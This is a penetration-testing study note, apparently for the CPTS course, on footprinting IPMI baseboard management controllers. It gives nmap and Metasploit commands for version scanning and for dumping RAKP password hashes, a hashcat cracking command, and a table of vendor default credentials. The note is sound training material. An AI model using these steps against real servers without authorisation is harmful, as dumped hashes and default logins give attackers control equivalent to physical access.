```yaml
tags:

- cpts
- cybersecurity
- info gathering
```

# Cheat Sheet

```shell-session
# UDP port 623

# Nmap Scan
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local

# Metasploit Version Scan
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195 

# Metasploit Hash Dump
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195

# Hashcat Offline Cracking

```

# Concepts

- Intelligent Platform Management Interface (IPMI)

- Standardized approach for remote management and monitoring of computer systems, independent of the operating system or power state

- Uses direct network connection to the system's hardware and doesn't require access to the OS via a login shell.

- Can be used for remote upgrades without physical access.
  
  - Before the OS has booted to modify BIOS settings
  
  - When the host is fully powered down
  
  - Access to a host after a system failure

## Footprinting

- Communicates over `UDP port 623`

- Systems that use IPMI are called Baseboard management Controllers (BMCs)

- Most common BMCs are `HP iLO, Dell DRAC and Supermicro IPMI`

- Most of these have a web based management console, a remote access protocol like Telnet or SSH, and udp port 623

- Gaining access to the BMC is the same as physical access. 

### Nmap Scan

```shell
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### Metasploit Version Scan

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
```

### Metasploit Dumping Hashes

```shell
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
```

### Hashcat Cracking

```shell
sudo hashcat -m 7300 -w 3 -O {hash} /path/to/wordlist
```

### Default Creds

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

In case the default credentials don't work, take a look at the **flaw in the RAKP protocol in ipmi 2.0** [References](#References)

# References

- [623/UDP/TCP - IPMI | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)[623/UDP/TCP - IPMI | HackTricks](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)

- [Cracking IPMI Passwords Remotely](http://fish2.com/ipmi/remote-pw-cracking.html)

- [IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/)